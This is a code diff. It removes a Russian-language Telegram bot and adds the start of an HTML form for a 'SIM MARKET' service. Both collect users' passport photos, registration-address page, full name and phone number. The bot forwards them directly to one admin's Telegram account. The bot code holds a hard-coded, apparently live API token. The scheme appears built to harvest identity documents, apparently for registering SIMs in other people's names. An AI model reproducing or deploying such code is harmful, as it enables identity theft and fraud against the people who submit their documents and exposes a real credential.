@@ -1,127 +1,53 @@
-import logging
-from aiogram import Bot, Dispatcher, executor, types
-from aiogram.contrib.fsm_storage.memory import MemoryStorage
-from aiogram.dispatcher import FSMContext
-from aiogram.dispatcher.filters.state import State, StatesGroup
+ <!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SIM MARKET | Регистрация</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #0f172a; color: #f8fafc; font-family: sans-serif; }
+        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(251, 191, 36, 0.3); }
+        .step-hidden { display: none; }
+    </style>
+</head>
+<body class="p-4 flex items-center justify-center min-h-screen">
 
-# --- НАСТРОЙКИ ---
-API_TOKEN = '8666944440:AAFAmQuYaYmnJjhuQ9AmdBQim9V-kxNnxAo'
-ADMIN_ID = 8768514374 
-MANAGER_LINK = "https://t.me/SIamshop001"
+    <div class="max-w-md w-full glass p-8 rounded-3xl shadow-2xl">
+        <h1 class="text-3xl font-black text-yellow-500 text-center mb-2 uppercase">SIM MARKET</h1>
+        <p class="text-center text-gray-400 text-xs mb-8 uppercase tracking-widest">Система регистрации номеров</p>
 
-logging.basicConfig(level=logging.INFO)
-bot = Bot(token=API_TOKEN, parse_mode="HTML")
-storage = MemoryStorage()
-dp = Dispatcher(bot, storage=storage)
+        <form id="regForm" class="space-y-6">
+            <div id="step1">
+                <label class="block text-xs text-gray-500 mb-2 font-bold uppercase">Шаг 1/5: Выбранный номер</label>
+                <input type="text" id="chosen_num" placeholder="+7 (___) ___-__-__" class="w-full bg-slate-800 p-4 rounded-xl border border-slate-700 outline-none focus:border-yellow-500 text-white font-bold" required>
+                <button type="button" onclick="nextStep(2)" class="w-full bg-yellow-500 text-black font-black py-4 rounded-xl mt-6 uppercase">Далее</button>
+            </div>
 
-# Состояния оформления (строгий порядок)
-class Order(StatesGroup):
-    number = State()        # Выбор номера
-    passport_main = State() # Лицевая сторона
-    passport_reg = State()  # Прописка
-    name = State()          # ФИО
-    contact = State()       # Контактный телефон
+            <div id="step2" class="step-hidden text-center">
+                <label class="block text-xs text-gray-500 mb-4 font-bold uppercase text-left">Шаг 2/5: Фото паспорта (Лицо)</label>
+                <div class="border-2 border-dashed border-slate-700 p-8 rounded-2xl bg-slate-800/50 relative cursor-pointer hover:border-yellow-500">
+                    <input type="file" id="photo_main" accept="image/*" class="absolute inset-0 opacity-0 cursor-pointer" required onchange="updateLabel('l1')">
+                    <span id="l1" class="text-sm text-gray-400 font-medium">📸 Пришлите фото разворота</span>
+                </div>
+                <div class="grid grid-cols-2 gap-2 mt-4">
+                    <button type="button" onclick="nextStep(1)" class="bg-slate-700 text-white py-3 rounded-xl font-bold uppercase">Назад</button>
+                    <button type="button" onclick="nextStep(3)" class="bg-yellow-500 text-black py-3 rounded-xl font-bold uppercase">Далее</button>
+                </div>
+            </div>
 
-# --- ГЛАВНОЕ МЕНЮ ---
-def main_menu():
-    keyboard = types.InlineKeyboardMarkup(row_width=1)
-    keyboard.add(
-        types.InlineKeyboardButton("📝 Начать регистрацию номера", callback_data="start_order"),
-        types.InlineKeyboardButton("👨‍💻 Связаться с Курбаном", url=MANAGER_LINK)
-    )
-    return keyboard
+            <div id="step3" class="step-hidden text-center">
+                <label class="block text-xs text-gray-500 mb-4 font-bold uppercase text-left">Шаг 3/5: Фото прописки</label>
+                <div class="border-2 border-dashed border-slate-700 p-8 rounded-2xl bg-slate-800/50 relative cursor-pointer hover:border-yellow-500">
+                    <input type="file" id="photo_reg" accept="image/*" class="absolute inset-0 opacity-0 cursor-pointer" required onchange="updateLabel('l2')">
+                    <span id="l2" class="text-sm text-gray-400 font-medium">🏠 Фото страницы с адресом</span>
+                </div>
+                <div class="grid grid-cols-2 gap-2 mt-4">
+                    <button type="button" onclick="nextStep(2)" class="bg-slate-700 text-white py-3 rounded-xl font-bold uppercase">Назад</button>
+                    <button type="button" onclick="nextStep(4)" class="bg-yellow-500 text-black py-3 rounded-xl font-bold uppercase">Далее</button>
+                </div>
+            </div>
 
-@dp.message_handler(commands=['start'])
-async def cmd_start(message: types.Message):
-    await message.answer(
-        "<b>Система регистрации SIM MARKET</b> 📱\n\n"
-        "Для оформления номера подготовьте оригинал паспорта.\n"
-        "Убедитесь, что камера чистая, а на фото нет бликов от вспышки.",
-        reply_markup=main_menu()
-    )
-
-# 1. Запрос номера
-@dp.callback_query_handler(text="start_order")
-async def start_order(call: types.CallbackQuery):
-    await Order.number.set()
-    await call.message.answer("<b>Шаг 1/5:</b>\nВведите номер телефона, который вы выбрали:")
-
-# 2. Запрос лицевой стороны паспорта
-@dp.message_handler(state=Order.number)
-async def process_num(message: types.Message, state: FSMContext):
-    await state.update_data(chosen_num=message.text)
-    await Order.next()
-    await message.answer(
-        "<b>Шаг 2/5: Фото паспорта (Лицевая сторона)</b>\n\n"
-        "Пришлите фото разворота с фотографией.\n"
-        "⚠️ <b>Важно:</b> Все данные должны быть четко видны, без бликов и перекрытий пальцами.",
-        reply_markup=types.ReplyKeyboardRemove()
-    )
-
-# Проверка фото лицевой стороны
-@dp.message_handler(content_types=['photo'], state=Order.passport_main)
-async def process_passport_main(message: types.Message, state: FSMContext):
-    # Берем лучшее качество фото
-    photo = message.photo[-1]
-    
-    # Базовая проверка на размер (защита от совсем плохих фото)
-    if photo.width < 600 or photo.height < 600:
-        await message.answer("❌ <b>Фото слишком низкого качества!</b>\nПожалуйста, сделайте более четкий снимок при хорошем свете.")
-        return
-
-    await state.update_data(photo_main=photo.file_id)
-    await Order.next()
-    await message.answer("✅ Принято. \n\n<b>Шаг 3/5: Фото прописки</b>\nПришлите фото страницы с адресом регистрации:")
-
-# 3. Запрос прописки
-@dp.message_handler(content_types=['photo'], state=Order.passport_reg)
-async def process_passport_reg(message: types.Message, state: FSMContext):
-    photo = message.photo[-1]
-    
-    if photo.width < 600:
-        await message.answer("❌ Фото прописки неразборчиво. Переснимите, пожалуйста.")
-        return
-
-    await state.update_data(photo_reg=photo.file_id)
-    await Order.next()
-    await message.answer("<b>Шаг 4/5:</b>\nВведите ваши ФИО полностью:")
-
-# 4. ФИО
-@dp.message_handler(state=Order.name)
-async def process_name(message: types.Message, state: FSMContext):
-    await state.update_data(user_name=message.text)
-    await Order.next()
-    await message.answer("<b>Шаг 5/5:</b>\nВведите ваш контактный телефон:")
-
-# 5. Финал и отправка админу
-@dp.message_handler(state=Order.contact)
-async def process_contact(message: types.Message, state: FSMContext):
-    data = await state.get_data()
-    client = message.from_user
-    
-    await message.answer("⌛ <b>Проверяем данные...</b>")
-    
-    # Текст для админа
-    report = (
-        "🆕 <b>НОВАЯ РЕГИСТРАЦИЯ</b>\n\n"
-        f"📱 <b>Номер:</b> <code>{data['chosen_num']}</code>\n"
-        f"👤 <b>ФИО:</b> {data['user_name']}\n"
-        f"📞 <b>Контакт:</b> {message.text}\n"
-        f"🔗 <b>Профиль:</b> <a href='tg://user?id={client.id}'>Перейти</a>"
-    )
-
-    # Отправка фото и данных тебе
-    await bot.send_message(ADMIN_ID, report)
-    await bot.send_photo(ADMIN_ID, data['photo_main'], caption="🖼 Лицевая сторона")
-    await bot.send_photo(ADMIN_ID, data['photo_reg'], caption="🏠 Прописка")
-
-    await message.answer("✅ <b>Все данные получены!</b>\nКурбан проверит документы и свяжется с вами для активации номера.")
-    await state.finish()
-
-# Если пользователь прислал текст вместо фото
-@dp.message_handler(state=[Order.passport_main, Order.passport_reg])
-async def not_photo(message: types.Message):
-    await message.answer("Пожалуйста, пришлите именно <b>фотографию</b> документа.")
-
-if __name__ == '__main__':
-    executor.start_polling(dp, skip_updates=True)
+            <div id="step4" class="step-hidden">
+                <label class="block text-xs text-gray-500 mb-2 font-bold uppercase">Шаг 4/5: Ваши ФИО полностью</label>
+                <input type="text" id="user_name" placeholder="Иванов Иван Иванович" class="w-full bg-slate-800 p-4 rounded-xl border border-slate-700 outline-none focus:border-yellow-500 text-white" required>
